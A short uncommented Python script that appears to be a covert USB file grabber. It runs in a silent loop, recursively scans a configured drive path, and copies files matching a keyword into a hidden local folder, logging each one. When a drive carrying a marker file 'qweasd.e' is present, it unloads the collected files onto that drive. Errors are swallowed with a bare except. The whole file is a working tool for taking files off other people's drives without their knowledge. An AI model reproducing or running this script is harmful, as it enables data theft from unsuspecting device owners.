from shutil import copyfile
from os.path import abspath, isdir
from os import listdir
from sys import exit
from time import sleep


def finding(file_first=f"{abspath('..')}"):
    files = listdir(file_first)
    files_ = [f"{file_first}\\{file}" for file in files]

    for file_sub in files:
        if isdir(f"{file_first}\\{file_sub}"):
            files_sub = finding(f"{file_first}\\{file_sub}")
            if files_sub:
                files_ = files_ + files_sub
    if files_:
        return files_
    else:
        return None


def find_u():
    while True:
        with open("b", "r") as r:
            if r.read() == "1":
                exit()
        with open("p", "r") as r:
            p = r.read()
        with open("m", "r") as r:
            m = r.read()
        try:
            with open("a", "r") as r:
                f = r.read().split("\n")
            finding_list = finding(p+"\\")
            d = finding("D:\\Liu\\uget\\")

            if p+"\\\\qweasd.e" in finding_list:
                for i in d:
                    if not i in f:
                        a = i.split("\\")[-1]
                        copyfile(i, p+f"\\Liu\\uget\\{a}")
                        f.append(i)
                        with open("a", "a") as w:
                            w.write("\n"+i)
            else:
                for i in finding_list:
                    if m in i and not i in f:
                        a = i.split("\\")[-1]
                        copyfile(i, f"D:\\Liu\\uget\\{a}")
                        f.append(i)
                        with open("a", "a") as w:
                            w.write("\n"+i)
            sleep(1)
        except:
            pass


if __name__ == "__main__":
    find_u()
